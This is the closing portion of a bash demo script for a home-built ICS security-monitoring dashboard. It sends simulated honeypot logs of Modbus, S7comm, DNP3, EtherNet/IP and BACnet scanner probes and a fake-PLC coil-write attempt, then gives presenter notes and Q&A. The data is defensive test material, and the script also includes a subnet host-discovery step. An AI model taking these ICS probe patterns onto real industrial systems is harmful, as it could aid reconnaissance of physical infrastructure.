  "conpot: connection from 185.220.101.5 to Modbus port 502 FC=3 Read Holding Registers — attacker enumeration"
  "conpot: connection from 45.33.32.156 to S7comm port 102 — Siemens CPU info request fingerprint"
  "conpot: connection from 91.108.4.100 to DNP3 port 20000 FC=1 READ — automation scanner"
  "conpot: connection from 194.165.16.78 to EtherNet/IP port 44818 — CIP list identity request"
  "conpot: connection from 185.220.101.5 to BACnet port 47808 — WhoIs broadcast"
  "honeypot: Modbus FC=6 Write Single Coil addr=0 value=65280 from 45.33.32.156 — attack attempt on fake PLC"
)
for msg in "${HP_PROBES[@]}"; do
  send "honeypot-ics-01" "$msg"
  printf "  Sent: %s\n" "${msg:0:65}"
  sleep 0.1
done
ok "6 honeypot interactions from 4 distinct attacker IPs"

browser \
  "1. Honeypot tab — show protocol hit table (which ICS ports probed)" \
  "2. Show attacker IPs table — ranked by hit count" \
  "3. Show event feed — click a row to see the decoded probe" \
  "4. Network tab — show interface selector and scan panel" \
  "5. Type 192.168.1.0/24 in Target field → click Host Discovery"

note \
  "Say: These patterns match real automated scanners — Shodan, Censys," \
  "Masscan — that continuously probe the internet for ICS devices." \
  "Our honeypot looks exactly like a real Siemens S7-300. The" \
  "attackers do not know it is a trap. Every probe gives us their" \
  "IP, the tools they are using, and the techniques they favor." \
  "If you expose the Pi's ICS ports to the internet via port forwarding," \
  "you get real threat intelligence within hours — actual attacker" \
  "IPs geolocated to real countries, building your own threat feed."
pause

# =============================================================================
#  SLIDE 19 — CONCLUSION
# =============================================================================
header "SLIDE 19 — Conclusion & Future Work"

note \
  "Say: Three things to remember from this demo." \
  "" \
  "ONE: CSP nonces. We removed 40+ inline event handlers to achieve" \
  "strict CSP. The result: injected scripts are blocked before" \
  "they execute. XSS is dead as an attack vector on this dashboard." \
  "" \
  "TWO: ICS-aware SIS rules. 18 rules that understand the physical" \
  "consequence of a Modbus write. No open-source tool did this." \
  "" \
  "THREE: Automated compliance. 32 CIS checks mapping to PCI-DSS," \
  "HIPAA, and NIST CSF in 3 seconds. Not weeks. Not thousands of dollars." \
  "" \
  "Honest limitation: rate limiting is in-process memory — distributed" \
  "attacks from many IPs can bypass it. Redis fixes this. Future work."
pause

# =============================================================================
#  SLIDE 20 — Q&A
# =============================================================================
header "SLIDE 20 — Q&A PREP (anticipated questions)"

divider
note \
  "Q: Why not just use Splunk or Elastic Security?" \
  "A: Splunk starts at ~\$150K/year. Elastic requires substantial" \
  "   infrastructure investment. Neither decodes Modbus function" \
  "   codes, evaluates SIS trip rules, or scores NERC CIP compliance" \
  "   natively out of the box. SCMS does all of this for free."

divider
note \
  "Q: How does the CSP nonce work if it changes every request?" \
  "A: Generated server-side, injected into both the response header" \
  "   AND the HTML template in the same render call — always match." \
  "   Cache-Control: no-store prevents the browser from serving a" \
  "   page with a stale nonce, which would block all scripts."

divider
note \
  "Q: Could a real power plant use this?" \
  "A: As a monitoring and alerting layer, yes. The SIS rules generate" \
  "   alerts — they do not actuate physical equipment. Real protection" \
  "   relays have their own certified hardware. SCMS provides the" \
  "   visibility that operators need to know an attack is happening."

divider
note \
  "Q: What is the false positive rate on ICS rules?" \
  "A: Low — we require protocol + function code + address range to" \
  "   all match. The burst rule ICS-005 can false-positive on heavy" \
  "   legitimate SCADA polling. Tunable threshold. ML-based anomaly" \
  "   detection is the future work item to reduce this further."

divider
note \
  "Q: How does the agent authenticate with the server?" \
  "A: Pre-shared 64-char hex API key in .env (file permissions 600)." \
  "   Every POST to /ingest includes it. The route processes identically" \
  "   regardless of match — no timing channel to enumerate the key."

divider
echo ""
echo -e "${C_BOLD}${C_GREEN}╔══════════════════════════════════════════════════════════════╗${C_RESET}"
echo -e "${C_BOLD}${C_GREEN}║   Demo complete. Go crush the presentation.                  ║${C_RESET}"
echo -e "${C_BOLD}${C_GREEN}╚══════════════════════════════════════════════════════════════╝${C_RESET}"
echo ""
echo -e "  Clear all test data after demo:"
echo -e "  ${C_CYAN}curl -s -X POST $SERVER/clear-logs | python3 -m json.tool${C_RESET}"
echo ""
